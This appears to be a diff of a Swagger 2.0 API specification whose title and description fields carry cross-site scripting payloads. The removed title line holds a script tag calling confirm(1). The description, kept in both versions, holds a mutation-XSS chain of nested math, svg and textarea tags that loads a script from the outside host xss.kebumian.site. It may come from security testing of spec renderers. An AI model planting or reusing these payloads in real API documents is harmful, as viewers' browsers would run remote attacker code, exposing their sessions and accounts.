@@ -1,8 +1,8 @@
 swagger: '2.0'
 info:
-  title: TESTED<svg><!--?php "--><script>confirm(1)</script>?&gt;</svg>
+  title: TESTED
   description: |
-    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea>"><script src=//xss.kebumian.site></script>">
+    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea>"><script src=//xss.kebumian.site></script>
 paths:
   /accounts:
     get:
